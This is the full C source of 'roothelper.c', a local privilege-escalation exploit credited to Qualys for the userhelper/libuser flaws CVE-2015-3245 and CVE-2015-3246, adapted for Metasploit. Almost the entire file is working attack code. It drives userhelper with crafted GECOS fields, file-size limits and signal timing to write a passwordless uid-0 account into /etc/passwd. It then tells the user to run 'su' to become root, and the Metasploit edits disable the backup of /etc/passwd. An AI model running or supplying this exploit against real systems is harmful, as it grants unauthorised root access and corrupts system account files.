/*
 * roothelper.c - an unusual local root exploit against:
 * CVE-2015-3245 userhelper chfn() newline filtering
 * CVE-2015-3246 libuser passwd file handling
 * Copyright (C) 2015 Qualys, Inc.
 *
 * gecos_* types and functions inspired by userhelper.c
 * Copyright (C) 1997-2003, 2007, 2008 Red Hat, Inc.
 *
 * UH_* #defines and comments inspired by userhelper.h
 * Copyright (C) 1997-2001, 2007 Red Hat, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

// Modified for Metasploit (see comments marked 'msf note')
 
#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <limits.h>
#include <pwd.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
 
/* A maximum GECOS field length.  There's no hard limit, so we guess. */
#define GECOS_LENGTH                    127
 
typedef char gecos_field[GECOS_LENGTH];
 
/* A structure to hold broken-out GECOS data.  The number and names of the
 * fields are dictated entirely by the flavor of finger we use.  Seriously. */
struct gecos_data {
    gecos_field full_name;      /* full user name */
    gecos_field office;         /* office */
    gecos_field office_phone;   /* office phone */
    gecos_field home_phone;     /* home phone */
    gecos_field site_info;      /* other stuff */
};
 
static struct userhelper {
    struct gecos_data gecos;
    rlim_t fsizelim;
    pid_t pid;
    int fd;
} userhelpers[GECOS_LENGTH];
 
static void
die_in_parent(const char *const file, const unsigned int line,
              const char *const function)
{
    fprintf(stderr, "died in parent: %s:%u: %s\n", file, line, function);
    fflush(stderr);
 
    unsigned int i;
    for (i = 0; i < GECOS_LENGTH; i++) {
        const pid_t pid = userhelpers[i].pid;
        if (pid <= 0) continue;
        kill(pid, SIGKILL);
    }
    _exit(EXIT_FAILURE);
}
 
static void
die_in_child(const char *const file, const unsigned int line,
             const char *const function)
{
    fprintf(stderr, "died in child: %s:%u: %s\n", file, line, function);
    exit(EXIT_FAILURE);
}
 
static void (*die_fn)(const char *, unsigned int, const char *) = die_in_parent;
#define die() die_fn(__FILE__, __LINE__, __func__)
 
static void *
xmalloc(const size_t size)
{
    if (size <= 0) die();
    if (size >= INT_MAX) die();
    void *const ptr = malloc(size);
    if (ptr == NULL) die();
    return ptr;
}
 
static void *
xrealloc(void *const old, const size_t size)
{
    if (size <= 0) die();
    if (size >= INT_MAX) die();
    void *const new = realloc(old, size);
    if (new == NULL) die();
    return new;
}
 
static char *
xstrndup(const char *const old, const size_t len)
{
    if (old == NULL) die();
    if (len >= INT_MAX) die();
 
    char *const new = strndup(old, len);
 
    if (new == NULL) die();
    if (len != strlen(new)) die();
    return new;
}
 
static int
xsnprintf(char *const str, const size_t size, const char *const format, ...)
{
    if (str == NULL) die();
    if (size <= 0) die();
    if (size >= INT_MAX) die();
    if (format == NULL) die();
 
    va_list ap;
    va_start(ap, format);
    const int len = vsnprintf(str, size, format, ap);
    va_end(ap);
 
    if (len < 0) die();
    if ((unsigned int)len >= size) die();
    if ((unsigned int)len != strlen(str)) die();
    return len;
}
 
static int
xopen(const char *const pathname, const int flags)
{
    if (pathname == NULL) die();
    if (*pathname != '/') die();
    if (flags != O_RDONLY) die();
 
    const int fd = open(pathname, flags);
    if (fd <= -1) die();
 
    static const struct flock rdlock = {
        .l_type = F_RDLCK,
        .l_whence = SEEK_SET,
        .l_start = 0,
        .l_len = 0
    };
    if (fcntl(fd, F_SETLK, &rdlock) != 0) die();
    return fd;
}
 
static void
xclose(const int fd)
{
    if (fd <= -1) die();
    static const struct flock unlock = {
        .l_type = F_UNLCK,
        .l_whence = SEEK_SET,
        .l_start = 0,
        .l_len = 0
    };
    if (fcntl(fd, F_SETLK, &unlock) != 0) die();
    if (close(fd) != 0) die();
}
 
#define GECOS_BADCHARS ":,=\n"
 
/* A simple function to compute the size of a gecos string containing the
 * data we have. */
static size_t
gecos_size(const struct gecos_data *const parsed)
{
    if (parsed == NULL) die();
 
    size_t len = 4; /* commas! */
    len += strlen(parsed->full_name);
    len += strlen(parsed->office);
    len += strlen(parsed->office_phone);
    len += strlen(parsed->home_phone);
    len += strlen(parsed->site_info);
    len++;
    return len;
}
 
/* Parse the passed-in GECOS string and set PARSED to its broken-down contents.
   Note that the parsing is performed using the convention obeyed by BSDish
   finger(1) under Linux. */
static void
gecos_parse(const char *const gecos, struct gecos_data *const parsed)
{
    if (gecos == NULL) die();
    if (strlen(gecos) >= INT_MAX) die();
 
    if (parsed == NULL) die();
    memset(parsed, 0, sizeof(*parsed));
 
    unsigned int i;
    const char *field = gecos;
 
    for (i = 0; ; i++) {
        const char *field_end = strchrnul(field, ',');
        gecos_field *dest = NULL;
 
        switch (i) {
        case 0:
            dest = &parsed->full_name;
            break;
        case 1:
            dest = &parsed->office;
            break;
        case 2:
            dest = &parsed->office_phone;
            break;
        case 3:
            dest = &parsed->home_phone;
            break;
        case 4:
            // msf note: changed `rawmemchar` to `memchr` for cross-compile
            //field_end = rawmemchr(field_end, '\0');
            field_end = memchr(field_end, '\0', 16);
            dest = &parsed->site_info;
            break;
        default:
            die();
        }
        const size_t field_len = field_end - field;
        xsnprintf(*dest, sizeof(*dest), "%.*s", (int)field_len, field);
        if (strlen(*dest) != field_len) die();
 
        if (strpbrk(*dest, GECOS_BADCHARS) != NULL && i != 4) die();
 
        if (*field_end == '\0') break;
        field = field_end + 1;
    }
    if (gecos_size(parsed) > GECOS_LENGTH) die();
}
 
/* Assemble a new gecos string. */
static const char *
gecos_assemble(const struct gecos_data *const parsed)
{
    static char ret[GECOS_LENGTH];
    size_t i;
 
    if (parsed == NULL) die();
    /* Construct the basic version of the string. */
    xsnprintf(ret, sizeof(ret), "%s,%s,%s,%s,%s",
                                parsed->full_name,
                                parsed->office,
                                parsed->office_phone,
                                parsed->home_phone,
                                parsed->site_info);
    /* Strip off terminal commas. */
    i = strlen(ret);
    while ((i > 0) && (ret[i - 1] == ',')) {
        ret[i - 1] = '\0';
        i--;
    }
    return ret;
}
 
/* Descriptors used to communicate between userhelper and consolhelper. */
#define UH_INFILENO 3
#define UH_OUTFILENO 4
 
/* Userhelper request format:
   request code as a single character,
   request data size as UH_REQUEST_SIZE_DIGITS decimal digits
   request data
   '\n' */
#define UH_REQUEST_SIZE_DIGITS 8
 
/* Synchronization point code. */
#define UH_SYNC_POINT 32
 
/* Valid userhelper request codes. */
#define UH_ECHO_ON_PROMPT 34
#define UH_ECHO_OFF_PROMPT 35
#define UH_EXPECT_RESP 39
#define UH_SERVICE_NAME 40
#define UH_USER 42
 
/* Consolehelper response format:
   response code as a single character,
   response data
   '\n' */
 
/* Consolehelper response codes. */
#define UH_TEXT 33
 
/* Valid userhelper error codes. */
#define ERR_UNK_ERROR           255     /* unknown error */
 
/* Paths, flag names, and other stuff. */
#define UH_PATH "/usr/sbin/userhelper"
#define UH_FULLNAME_OPT "-f"
#define UH_OFFICE_OPT "-o"
#define UH_OFFICEPHONE_OPT "-p"
#define UH_HOMEPHONE_OPT "-h"
 
static char
read_request(const int fd, char *const data, const size_t size)
{
    if (fd <= -1) die();
    if (data == NULL) die();
    if (size >= INT_MAX) die();
 
    char header[1 + UH_REQUEST_SIZE_DIGITS + 1];
    if (read(fd, header, sizeof(header)-1) != sizeof(header)-1) die();
    header[sizeof(header)-1] = '\0';
 
    errno = 0;
    char *endptr = NULL;
    const unsigned long len = strtoul(&header[1], &endptr, 10);
    if (errno != 0 || endptr != &header[sizeof(header)-1]) die();
 
    if (len >= size) die();
    if (read(fd, data, len+1) != (ssize_t)(len+1)) die();
    if (data[len] != '\n') die();
    data[len] = '\0';
 
    if (strlen(data) != len) die();
    if (strchr(data, '\n') != NULL) die();
    return header[0];
}
 
static void
send_reply(const int fd, const unsigned char type, const char *const data)
{
    if (fd <= -1) die();
    if (!isascii(type)) die();
    if (!isprint(type)) die();
    if (data == NULL) die();
    if (strpbrk(data, "\r\n") != NULL) die();
 
    char buf[BUFSIZ];
    const int len = xsnprintf(buf, sizeof(buf), "%c%s\n", (int)type, data);
    if (send(fd, buf, len, MSG_NOSIGNAL) != len) die();
}
 
#define ETCDIR "/etc"
#define PASSWD "/etc/passwd"
#define BACKUP "/etc/passwd-"
 
static struct {
    char username[64];
    char password[64];
    struct gecos_data gecos;
} my;
 
static volatile sig_atomic_t is_child_dead;
 
static void
sigchild_handler(const int signum __attribute__ ((__unused__)))
{
    is_child_dead = true;
}
 
static int
wait_for_userhelper(struct userhelper *const uh, const int options)
{
    if (uh == NULL) die();
    if (uh->pid <= 0) die();
    if ((options & ~(WUNTRACED | WCONTINUED)) != 0) die();
 
    int status;
    for (;;) {
        const pid_t pid = waitpid(uh->pid, &status, options);
        if (pid == uh->pid) break;
        if (pid > 0) _exit(255);
 
        if (pid != -1) die();
        if (errno != EINTR) die();
    }
    if (WIFEXITED(status) || WIFSIGNALED(status)) uh->pid = -1;
    return status;
}
 
static void
forkstop_userhelper(struct userhelper *const uh)
{
    if (uh == NULL) die();
    if (uh->pid != 0) die();
    if (gecos_size(&uh->gecos) > GECOS_LENGTH) die();
 
    struct rlimit fsize;
    if (getrlimit(RLIMIT_FSIZE, &fsize) != 0) die();
    if (uh->fsizelim > fsize.rlim_max) die();
    if (uh->fsizelim <= 0) die();
    fsize.rlim_cur = uh->fsizelim;
 
    cpu_set_t old_cpus;
    CPU_ZERO(&old_cpus);
    if (sched_getaffinity(0, sizeof(old_cpus), &old_cpus) != 0) die();
 
    { const int cpu = sched_getcpu();
    if (cpu >= CPU_SETSIZE) die();
    if (cpu < 0) die();
    cpu_set_t new_cpus;
    CPU_ZERO(&new_cpus);
    CPU_SET(cpu, &new_cpus);
    if (sched_setaffinity(0, sizeof(new_cpus), &new_cpus) != 0) die(); }
 
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) die();
 
    if (is_child_dead) die();
    static const struct sigaction sigchild_action = {
        .sa_handler = sigchild_handler, .sa_flags = SA_NOCLDSTOP };
    if (sigaction(SIGCHLD, &sigchild_action, NULL) != 0) die();
 
    uh->pid = fork();
    if (uh->pid <= -1) die();
 
    if (uh->pid == 0) {
        die_fn = die_in_child;
        if (close(sv[1]) != 0) die();
        if (dup2(sv[0], UH_INFILENO) != UH_INFILENO) die();
        if (dup2(sv[0], UH_OUTFILENO) != UH_OUTFILENO) die();
 
        const int devnull_fd = open("/dev/null", O_RDWR);
        if (dup2(devnull_fd, STDIN_FILENO) != STDIN_FILENO) die();
        if (dup2(devnull_fd, STDOUT_FILENO) != STDOUT_FILENO) die();
        if (dup2(devnull_fd, STDERR_FILENO) != STDERR_FILENO) die();
 
        if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();
        if (signal(SIGXFSZ, SIG_IGN) == SIG_ERR) die();
        if (setrlimit(RLIMIT_FSIZE, &fsize) != 0) die();
 
        if (setpriority(PRIO_PROCESS, 0, +19) != 0) die();
        static const struct sched_param sched_param = { .sched_priority = 0 };
        (void) sched_setscheduler(0, SCHED_IDLE, &sched_param);
 
        char *const argv[] = { UH_PATH,
                               UH_FULLNAME_OPT,    uh->gecos.full_name,
                               UH_OFFICE_OPT,      uh->gecos.office,
                               UH_OFFICEPHONE_OPT, uh->gecos.office_phone,
                               UH_HOMEPHONE_OPT,   uh->gecos.home_phone,
                               NULL };
        char *const envp[] = { NULL };
        execve(UH_PATH, argv, envp);
        die();
    }
    if (die_fn != die_in_parent) die();
    if (close(sv[0]) != 0) die();
    uh->fd = sv[1];
 
    unsigned long expected_responses = 0;
    for (;;) {
        char data[BUFSIZ];
        const char type = read_request(uh->fd, data, sizeof(data));
        if (type == UH_SYNC_POINT) break;
 
        switch (type) {
        case UH_USER:
            if (strcmp(data, my.username) != 0) die();
            break;
        case UH_SERVICE_NAME:
            if (strcmp(data, "chfn") != 0) die();
            break;
        case UH_ECHO_ON_PROMPT:
        case UH_ECHO_OFF_PROMPT:
            if (++expected_responses == 0) die();
            break;
        case UH_EXPECT_RESP:
            if (strtoul(data, NULL, 10) != expected_responses) die();
            break;
        default:
            break;
        }
    }
    if (expected_responses != 1) die();
 
    const int lpasswd_fd = xopen(PASSWD, O_RDONLY);
    const int inotify_fd = inotify_init();
    if (inotify_fd <= -1) die();
    if (inotify_add_watch(inotify_fd, PASSWD, IN_CLOSE_NOWRITE |
          IN_OPEN) <= -1) die();
    if (inotify_add_watch(inotify_fd, BACKUP, IN_CLOSE_WRITE) <= -1) {
        if (errno != ENOENT) die();
        if (inotify_add_watch(inotify_fd, ETCDIR, IN_CREATE) <= -1) die();
    }
 
    send_reply(uh->fd, UH_TEXT, my.password);
    send_reply(uh->fd, UH_SYNC_POINT, "");
    if (close(uh->fd) != 0) die();
    uh->fd = -1;
 
    unsigned int state = 0;
    static const uint32_t transition[] = { IN_CLOSE_WRITE,
                                           IN_CLOSE_NOWRITE, IN_OPEN, 0 };
    for (;;) {
        if (is_child_dead) die();
        char buffer[10 * (sizeof(struct inotify_event) + NAME_MAX + 1)];
        const ssize_t _buflen = read(inotify_fd, buffer, sizeof(buffer));
        if (is_child_dead) die();
 
        if (_buflen <= 0) die();
        size_t buflen = _buflen;
        if (buflen > sizeof(buffer)) die();
 
        struct inotify_event *ep;
        for (ep = (struct inotify_event *)(buffer); buflen >= sizeof(*ep);
             ep = (struct inotify_event *)(ep->name + ep->len)) {
            buflen -= sizeof(*ep);
 
            if (ep->len > 0) {
                if (buflen < ep->len) die();
                buflen -= ep->len;
                if ((ep->mask & IN_CREATE) == 0) die();
                (void) inotify_add_watch(inotify_fd, BACKUP, IN_CLOSE_WRITE);
                continue;
            }
            if (ep->len != 0) die();
            while ((ep->mask & transition[state]) != 0) {
                ep->mask &= ~transition[state++];
                if (transition[state] == 0) goto stop_userhelper;
            }
        }
        if (buflen != 0) die();
    }
    stop_userhelper:
    if (kill(uh->pid, SIGSTOP) != 0) die();
    if (close(inotify_fd) != 0) die();
 
    const int status = wait_for_userhelper(uh, WUNTRACED);
    if (!WIFSTOPPED(status)) die();
    if (WSTOPSIG(status) != SIGSTOP) die();
 
    xclose(lpasswd_fd);
    if (signal(SIGCHLD, SIG_DFL) == SIG_ERR) die();
    if (sched_setaffinity(0, sizeof(old_cpus), &old_cpus) != 0) die();
}
 
static void
continue_userhelper(struct userhelper *const uh)
{
    if (uh == NULL) die();
    if (uh->fd != -1) die();
    if (uh->pid <= 0) die();
 
    if (kill(uh->pid, SIGCONT) != 0) die();
 
    { const int status = wait_for_userhelper(uh, WCONTINUED);
    if (!WIFCONTINUED(status)) die(); }
 
    { const int status = wait_for_userhelper(uh, 0);
    if (!WIFEXITED(status)) die();
    if (WEXITSTATUS(status) !=
          ((uh->fsizelim == RLIM_INFINITY) ? 0 : ERR_UNK_ERROR)) die(); }
 
    memset(uh, 0, sizeof(*uh));
}
 
static void
create_backup_of_passwd_file(void)
{
    char backup[] = "/tmp/passwd-XXXXXX";
    const mode_t prev_umask = umask(077);
    const int ofd = mkstemp(backup);
    (void) umask(prev_umask);
    if (ofd <= -1) die();
 
    printf("Creating a backup copy of \"%s\" named \"%s\"\n", PASSWD, backup);
    const int ifd = xopen(PASSWD, O_RDONLY);
    for (;;) {
        char buf[BUFSIZ];
        const ssize_t len = read(ifd, buf, sizeof(buf));
        if (len == 0) break;
        if (len <= 0) die();
        if (write(ofd, buf, len) != len) die();
    }
    xclose(ifd);
    if (close(ofd) != 0) die();
}
 
static void
delete_lines_from_passwd_file(void)
{
    struct gecos_data gecos;
    memset(&gecos, 0, sizeof(gecos));
    xsnprintf(gecos.site_info, sizeof(gecos.site_info),
                             "%s", my.gecos.site_info);
    const ssize_t fullname_max = GECOS_LENGTH - gecos_size(&gecos);
    if (fullname_max >= GECOS_LENGTH) die();
    if (fullname_max <= 0) die();
 
    char fragment[64];
    xsnprintf(fragment, sizeof(fragment), "\n%s:", my.username);
 
    char *contents = NULL;
    for (;;) {
        struct stat st;
        const int fd = xopen(PASSWD, O_RDONLY);
        if (fstat(fd, &st) != 0) die();
        if (st.st_size >= INT_MAX) die();
        if (st.st_size <= 0) die();
 
        contents = xrealloc(contents, st.st_size + 1);
        if (read(fd, contents, st.st_size) != st.st_size) die();
        contents[st.st_size] = '\0';
        xclose(fd);
 
        const char *cp = strstr(contents, fragment);
        if (cp == NULL) die();
        cp = strchr(cp + 2, '\n');
        if (cp == NULL) die();
        if (cp[1] == '\0') break;
 
        char *const tp = contents + st.st_size-1;
        *tp = '\0';
        if (tp <= cp) die();
        if (tp - cp > fullname_max) cp = tp - fullname_max;
        cp = strpbrk(cp, "\n:, ");
        if (cp == NULL) die();
 
        const ssize_t fullname_len = tp - cp;
        if (fullname_len >= GECOS_LENGTH) die();
        if (fullname_len <= 0) die();
 
        printf("Deleting %zd bytes from \"%s\"\n", fullname_len, PASSWD);
 
        struct userhelper *const uh = &userhelpers[0];
        memset(uh->gecos.full_name, 'A', fullname_len);
        uh->fsizelim = st.st_size;
        forkstop_userhelper(uh);
        continue_userhelper(uh);
 
        uh->fsizelim = RLIM_INFINITY;
        forkstop_userhelper(uh);
        continue_userhelper(uh);
    }
    free(contents);
}
 
static size_t passwd_fsize;
static int generate_userhelpers(const char *);
#define IS_USER_LAST "last user in passwd file?"
 
static char candidate_users[256];
static char superuser_elect;
 
int
main(void)
{
    // msf note: don't backup /etc/passwd to /tmp
    //create_backup_of_passwd_file();
 
    { char candidate[] = "a";
    for (; candidate[0] <= 'z'; candidate[0]++) {
        if (getpwnam(candidate) != NULL) continue;
        strcat(candidate_users, candidate);
    } }
    if (candidate_users[0] == '\0') die();
 
    const struct passwd *const pwd = getpwuid(getuid());
    if ((pwd == NULL) || (pwd->pw_name == NULL)) die();
    xsnprintf(my.username, sizeof(my.username), "%s", pwd->pw_name);
    gecos_parse(pwd->pw_gecos, &my.gecos);
 
    if (fputs("Please enter your password:\n", stdout) == EOF) die();
    if (fgets(my.password, sizeof(my.password), stdin) == NULL) die();
    char *const newline = strchr(my.password, '\n');
    if (newline == NULL) die();
    *newline = '\0';
 
    { struct userhelper *const uh = &userhelpers[0];
    uh->fsizelim = RLIM_INFINITY;
    forkstop_userhelper(uh);
    continue_userhelper(uh); }
 
    retry:
    if (generate_userhelpers(IS_USER_LAST)) {
        struct userhelper *const uh1 = &userhelpers[1];
        strcpy(uh1->gecos.full_name, "\n");
        uh1->fsizelim = passwd_fsize + 1;
 
        struct userhelper *const uh0 = &userhelpers[0];
        uh0->fsizelim = passwd_fsize;
 
        forkstop_userhelper(uh1), forkstop_userhelper(uh0);
        continue_userhelper(uh1), continue_userhelper(uh0);
        if (generate_userhelpers(IS_USER_LAST)) die();
    }

    static const char a[] = "?::0:0::/:";
    printf("Attempting to add \"%s\" to \"%s\"\n", a, PASSWD);
 
    const int n = generate_userhelpers(a);
    if (n == -1) {
        static int retries;
        if (retries++) die();
        memset(userhelpers, 0, sizeof(userhelpers));
        delete_lines_from_passwd_file();
        goto retry;
    }
    if (n <= 0) die();
    if (n >= GECOS_LENGTH) die();
    if (superuser_elect == '\0') die();
 
    int i;
    for (i = n; --i >= 0; ) {
        printf("Starting and stopping userhelper #%d\n", i);
        forkstop_userhelper(&userhelpers[i]);
    }
    for (i = n; --i >= 0; ) {
        printf("Continuing stopped userhelper #%d\n", i);
        continue_userhelper(&userhelpers[i]);
    }
    printf("Exploit successful, run \"su %c\" to become root\n",
        (int)superuser_elect);
 
    { struct userhelper *const uh = &userhelpers[0];
    uh->fsizelim = RLIM_INFINITY;
    uh->gecos = my.gecos;
    forkstop_userhelper(uh);
    continue_userhelper(uh); }
 
    exit(EXIT_SUCCESS);
}
 
static void
generate_fullname(char *const fullname, const ssize_t fullname_len,
    const char c)
{
    if (fullname == NULL) die();
    if (fullname_len < 0) die();
    if (fullname_len >= GECOS_LENGTH) die();
 
    memset(fullname, 'A', fullname_len);
 
    if (fullname_len > 0 && strchr(GECOS_BADCHARS, c) == NULL) {
        if (!isascii((unsigned char)c)) die();
        if (!isgraph((unsigned char)c)) die();
        fullname[fullname_len-1] = c;
    }
}
 
static size_t siteinfo_len;
static size_t fullname_off;
 
static size_t before_fullname_len;
static char * before_fullname;
 
static size_t after_fullname_len;
static char * after_fullname;
 
static int
generate_userhelper(const char *const a, const int i, char *const contents)
{
    if (i < 0) {
        if (i != -1) die();
        return 0;
    }
    if (a == NULL) die();
    if ((unsigned int)i >= strlen(a)) die();
    if (contents == NULL) die();
 
    const char _c = a[i];
    const bool is_user_wildcard = (_c == '?');
    const char c = (is_user_wildcard ? candidate_users[0] : _c);
    if (c == '\0') die();
 
    const size_t target = passwd_fsize-1 + i;
    const rlim_t fsizelim = (a[i+1] == '\0') ? RLIM_INFINITY : target+1;
    if (fsizelim < passwd_fsize) die();
 
    const size_t contents_len = strlen(contents);
    if (contents_len < passwd_fsize) die();
    if (contents_len <= fullname_off) die();
 
    char *const fullname = contents + fullname_off;
    if (memcmp(fullname - before_fullname_len,
         before_fullname, before_fullname_len) != 0) die();
 
    const char *rest = strchr(fullname, '\n');
    if (rest == NULL) die();
    rest++;
 
    const ssize_t fullname_len = (rest - fullname) - after_fullname_len;
    if (fullname_len >= GECOS_LENGTH) die();
    if (fullname_len < 0) die();
 
    if (rest[-1] != '\n') die();
    generate_fullname(fullname, fullname_len, c);
    memcpy(fullname + fullname_len, after_fullname, after_fullname_len);
    if (rest[-1] != '\n') die();
 
    if (memcmp(rest - after_fullname_len,
      after_fullname, after_fullname_len) != 0) die();
 
    size_t offset;
    for (offset = fullname_off; offset < contents_len; offset++) {
 
        const char x = contents[offset];
        if (x == '\0') die();
        if (is_user_wildcard) {
            if (strchr(candidate_users, x) == NULL) continue;
            superuser_elect = x;
        } else {
            if (x != c) continue;
        }
 
        const ssize_t new_fullname_len = fullname_len + (target - offset);
        if (new_fullname_len < 0) continue; /* gecos_size() > GECOS_LENGTH */
        if (4 + new_fullname_len + siteinfo_len + 1 > GECOS_LENGTH) continue;
 
        if (offset < fullname_off + fullname_len) {
            if (offset != fullname_off + fullname_len-1) die();
            if (new_fullname_len == 0) continue;
        }
        if (offset >= contents_len-1) {
            if (offset != contents_len-1) die();
            if (fsizelim != RLIM_INFINITY) continue;
        }
 
        { char *const new_contents = xmalloc(contents_len+1 + GECOS_LENGTH);
 
        memcpy(new_contents, contents, fullname_off);
        generate_fullname(new_contents + fullname_off, new_fullname_len, c);
        memcpy(new_contents + fullname_off + new_fullname_len,
                   contents + fullname_off + fullname_len,
                   contents_len+1 - (fullname_off + fullname_len));
 
        if (strlen(new_contents) != contents_len +
                (new_fullname_len - fullname_len)) die();
 
        if (fsizelim != RLIM_INFINITY) {
            if (fsizelim >= strlen(new_contents)) die();
            if (fsizelim >= contents_len) die();
            memcpy(new_contents + fsizelim,
                       contents + fsizelim,
                       contents_len+1 - fsizelim);
        }
 
        const int err = generate_userhelper(a, i-1, new_contents);
        free(new_contents);
        if (err < 0) continue; }
 
        if (i >= GECOS_LENGTH) die();
        struct userhelper *const uh = &userhelpers[i];
        memset(uh, 0, sizeof(*uh));
 
        uh->fsizelim = fsizelim;
        if (new_fullname_len >= GECOS_LENGTH) die();
        generate_fullname(uh->gecos.full_name, new_fullname_len, c);
        return 0;
    }
    return -1;
}
 
static int
generate_userhelpers(const char *const _a)
{
    char a[GECOS_LENGTH];
    if (_a == NULL) die();
    const int n = xsnprintf(a, sizeof(a), "\n%s\n", _a);
    if (n >= GECOS_LENGTH) die();
    if (n <= 0) die();
 
    const int fd = xopen(PASSWD, O_RDONLY);
    struct stat st;
    if (fstat(fd, &st) != 0) die();
    if (st.st_size >= 10*1024*1024) die();
    if (st.st_size <= 0) die();
    passwd_fsize = st.st_size;
 
    char *const contents = xmalloc(passwd_fsize + 1);
    if (read(fd, contents, passwd_fsize) != (ssize_t)passwd_fsize) die();
    xclose(fd);
    contents[passwd_fsize] = '\0';
    if (strlen(contents) != passwd_fsize) die();
    if (contents[passwd_fsize-1] != '\n') die();
 
    char fragment[64];
    xsnprintf(fragment, sizeof(fragment), "\n%s:", my.username);
    const char *line = strstr(contents, fragment);
    if (line == NULL) die();
    line++;
 
    const char *rest = strchr(line, '\n');
    if (rest == NULL) die();
    if (rest <= line) die();
    rest++;
 
    if (strcmp(_a, IS_USER_LAST) == 0) {
        const bool is_user_last = (*rest == '\0');
        free(contents);
        return is_user_last;
    }
 
    unsigned int i;
    const char *field = line;
 
    for (i = 0; i <= 5; i++) {
        const char *const field_end = strchr(field, ':');
        if (field_end == NULL) die();
        if (field_end >= rest) die();
        const size_t field_len = field_end - field;
 
        switch (i) {
        case 0:
            if (field_len != strlen(my.username)) die();
            if (memcmp(field, my.username, field_len) != 0) die();
            break;
        case 1:
            if (*field != 'x') die();
            break;
        case 2:
            if (strtoimax(field, NULL, 10) != getuid()) die();
            break;
        case 3:
            if (strtoimax(field, NULL, 10) != getgid()) die();
            break;
        case 4:
            {
                char assembled[GECOS_LENGTH];
                xsnprintf(assembled, sizeof(assembled),
                            "%.*s", (int)field_len, field);
                if (strlen(assembled) != field_len) die();
 
                struct gecos_data gecos;
                memset(&gecos, 0, sizeof(gecos));
                xsnprintf(gecos.site_info, sizeof(gecos.site_info),
                                         "%s", my.gecos.site_info);
                if (strcmp(assembled, gecos_assemble(&gecos)) != 0) die();
            }
 
            siteinfo_len = strlen(my.gecos.site_info);
            fullname_off = field - contents;
 
            before_fullname_len = field - line;
            before_fullname = xstrndup(line, before_fullname_len);
 
            after_fullname_len = rest - field;
            after_fullname = xstrndup(field, after_fullname_len);
            break;
 
        case 5:
            if (*field != '/') die();
            break;
        default:
            die();
        }
        field = field_end + 1;
    }
 
    const int err = generate_userhelper(a, n-1, contents);
 
    free(before_fullname), before_fullname = NULL;
    free(after_fullname), after_fullname = NULL;
    free(contents);
 
    return (err < 0) ? -1 : n;
}
